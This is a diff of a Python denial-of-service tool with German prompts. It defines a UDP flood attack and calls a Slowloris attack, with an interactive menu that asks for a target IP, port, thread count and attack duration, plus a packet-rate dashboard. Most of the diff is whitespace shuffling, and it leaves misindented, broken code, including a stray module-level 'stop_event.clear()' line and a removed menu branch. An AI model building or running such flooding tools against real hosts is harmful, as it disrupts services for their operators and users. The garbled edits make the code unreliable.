@@ -30,7 +30,7 @@ def show_banner(color):
 def udp_flood_attack(ip, port, packet_size, packet_rate, threads, duration):
     stop_event = threading.Event()
     packet_counter = [0]  # List als mutable Zähler
-
+    
     def udp_flood():
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -152,11 +152,9 @@ if __name__ == "__main__":
             port = int(input("Ziel-Port: "))
             duration = int(input("Dauer des Angriffs (Sekunden): "))
             threads = int(input("Anzahl der Threads: "))
-
             slowloris_attack(ip, port, threads, duration)
-
+      stop_event.clear()
 # Dashboard
-
 def start_dashboard(packet_counter, stop_event):
     def dashboard():
         start_time = time.time()
@@ -173,12 +171,8 @@ def start_dashboard(packet_counter, stop_event):
 def stop_dashboard(dashboard_thread):
     dashboard_thread.join()
 
-            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
+                 input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
             stop_event.set()
-
-        elif choice == "2":  # Slowloris
-            ip = input("Ziel-IP-Adresse: ")
-            port = int(input("Ziel-Port: "))
 
             stop_event.clear()
 
@@ -189,6 +183,5 @@ def stop_dashboard(dashboard_thread):
             ]
             for thread in attack_threads:
                 thread.start()
-
             input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
             stop_event.set()
